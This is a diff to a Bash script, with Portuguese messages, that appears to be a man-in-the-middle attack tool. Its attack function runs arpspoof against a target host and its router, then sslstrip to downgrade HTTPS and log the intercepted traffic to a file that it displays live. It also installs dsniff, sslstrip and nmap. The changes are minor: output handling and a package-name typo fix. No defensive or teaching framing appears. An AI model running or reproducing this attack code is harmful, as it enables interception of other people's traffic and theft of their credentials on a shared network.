@@ -77,10 +77,11 @@ iniciar_ataque(){
 		nohup xterm -e 2> /dev/null "arpspoof -i eth0 -t $ip_target $ip_router" &
 		echo -e "\n ~ Iniciando o sslstrip..."
 		touch $ARQ
+		echo "Data: $DATA" > $ARQ
+		nohup xterm -e 2> /dev/null "tail -f $ARQ" &
 		nohup xterm -e 2> /dev/null "sslstrip -l 10000 -w $ARQ" &		
-		#echo "Data: $DATA" > $ARQ
-		echo "~ Vizualizando captura..."
-		tail -f $ARQ
+		echo "~ Vizualizando o arquivo..."
+		#nice -n -20 tail -f $ARQ
 	else
 		echo -e "\n [ FALHA ] Ocorreram erros em criar regras."
 		sleep 2
@@ -89,11 +90,11 @@ iniciar_ataque(){
 }
 
 install_req(){
-	echo -e "\n ~ Essa opção só esta disponivel para debian e derivados"
+	# Essa opção só esta disponivel para debian e derivados
 	echo -e "\n ~ Atualizando  a lista de repositórios..." 
 	apt-get update
 	echo -e "\n ~ Instalando os pocotes requeridos..."
-	apt-get install dsniff sslstrip xterm figleti nmap -y
+	apt-get install dsniff sslstrip xterm figlet nmap -y
 	if [ $? -eq 0 ]
 	then
 		echo "[ OK ]Os pacotes necessários foram instalados!"
